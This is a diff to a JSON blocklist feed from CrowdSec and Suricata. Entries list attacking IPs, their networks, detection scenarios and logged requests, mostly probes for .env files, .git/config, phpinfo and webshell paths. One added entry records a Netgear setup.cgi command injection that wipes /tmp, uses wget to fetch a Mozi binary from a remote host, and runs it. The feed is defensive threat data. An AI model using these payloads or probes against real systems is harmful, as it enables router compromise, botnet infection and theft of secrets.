@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-09-18T01:00:00Z",
+  "generated_at": "2026-09-18T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 58,
-    "v4": 58,
+    "total": 60,
+    "v4": 60,
     "v6": 0
   },
   "items": [
@@ -80,69 +80,6 @@
         "GET /@fs/etc/passwd?import&raw??",
         "GET /assets../../../etc/passwd",
         "GET /files../etc/passwd"
-      ]
-    },
-    {
-      "ip": "34.6.225.30",
-      "family": "v4",
-      "first_seen": "2026-09-11T09:00:00Z",
-      "last_seen": "2026-09-11T09:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files",
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.6.0.0/16",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /server-info.php",
-        "GET /server-status.php",
-        "GET /_environment",
-        "GET /phpinfo.php.bak",
-        "GET /phpinfo.php.old",
-        "GET /info.php",
-        "GET /admin/.env",
-        "GET /admin-panel/.env",
-        "GET /administrator/.env",
-        "GET /",
-        "GET /.git/config",
-        "GET /.env",
-        "GET /.env.local",
-        "GET /.env.production",
-        "GET /.env.staging",
-        "GET /.env.development",
-        "GET /.env.test",
-        "GET /.env.remote",
-        "GET /.env.bak",
-        "GET /.env.backup"
-      ]
-    },
-    {
-      "ip": "46.105.38.210",
-      "family": "v4",
-      "first_seen": "2026-09-11T07:00:00Z",
-      "last_seen": "2026-09-11T07:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "16276",
-      "asn_name": "OVH OVH SAS",
-      "asn_prefix": "46.105.0.0/16",
-      "payloads": [
-        "GET /robots.txt",
-        "GET /"
       ]
     },
     {
@@ -1553,7 +1490,7 @@
       "ip": "52.141.45.117",
       "family": "v4",
       "first_seen": "2026-09-16T17:00:00Z",
-      "last_seen": "2026-09-16T17:00:00Z",
+      "last_seen": "2026-09-18T04:00:00Z",
       "scenarios": [
         "crowdsec/http-admin-interface-probing",
         "crowdsec/http-probing",
@@ -1569,15 +1506,6 @@
         "mwl:cloud=\"azure\""
       ],
       "payloads": [
-        "GET /wp-content/index.php",
-        "GET /wp-includes/ID3/about.php",
-        "GET /wp-admin/js/index.php",
-        "GET /wp-content/admin.php",
-        "GET /admin.php?",
-        "GET /wp-admin/css/colors/modern/",
-        "GET /wp-content/plugins/hellopress/wp_filemanager.php",
-        "GET /this_is_a_new_hello_world.php",
-        "GET /jp.php",
         "GET /01.php",
         "GET /wp-filemannger.php",
         "GET /ba.php?p=",
@@ -1585,7 +1513,19 @@
         "GET /dyt8mjxc3yofbkoriukvgjaCdefault.php",
         "GET /robots.php",
         "GET /k.php",
-        "GET /w.php"
+        "GET /w.php",
+        "GET /wp-admin/css/",
+        "GET /admin.php",
+        "GET /admin.php?attempt=1",
+        "GET /alfa.php",
+        "GET /222.php",
+        "GET /3PJcpMFsD8B.php",
+        "GET /images.php",
+        "GET /goods.php",
+        "GET /k.php?p=",
+        "GET /media.php",
+        "GET /mac.php",
+        "GET /test1.php"
       ]
     },
     {
@@ -1758,6 +1698,113 @@
       ],
       "payloads": [
         "GET /owa/auth/x.js"
+      ]
+    },
+    {
+      "ip": "103.116.137.186",
+      "family": "v4",
+      "first_seen": "2026-09-18T10:00:00Z",
+      "last_seen": "2026-09-18T10:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "134922",
+      "asn_name": "RGTECHNOSOLUTIONS-AS - R G TECHNOSOLUTIONS PVT LTD",
+      "asn_prefix": "103.116.136.0/23",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://70.70.22.128:55807/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://70.70.22.128:55807/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "34.6.167.89",
+      "family": "v4",
+      "first_seen": "2026-09-18T06:00:00Z",
+      "last_seen": "2026-09-18T07:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.6.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /administrator/.env",
+        "GET /",
+        "GET /.git/config",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.staging",
+        "GET /.env.development",
+        "GET /.env.test",
+        "GET /.env.remote",
+        "GET /.env.bak",
+        "GET /.env.backup",
+        "GET /_environment",
+        "GET /phpinfo.php.bak",
+        "GET /phpinfo.php.old",
+        "GET /phpinfo.php~",
+        "GET /info.php.bak",
+        "GET /phpinfo.php.save",
+        "GET /info.php",
+        "GET /admin/.env"
+      ]
+    },
+    {
+      "ip": "199.45.154.71",
+      "family": "v4",
+      "first_seen": "2026-09-18T05:00:00Z",
+      "last_seen": "2026-09-18T05:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398722",
+      "asn_name": "CENSYS-ARIN-03 - Censys",
+      "asn_prefix": "199.45.154.0/24",
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "66.132.224.227",
+      "family": "v4",
+      "first_seen": "2026-09-18T01:00:00Z",
+      "last_seen": "2026-09-18T01:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398324",
+      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
+      "asn_prefix": "66.132.224.0/24",
+      "payloads": [
+        "GET /debug/pprof/",
+        "GET /sitemap.xml"
       ]
     }
   ]
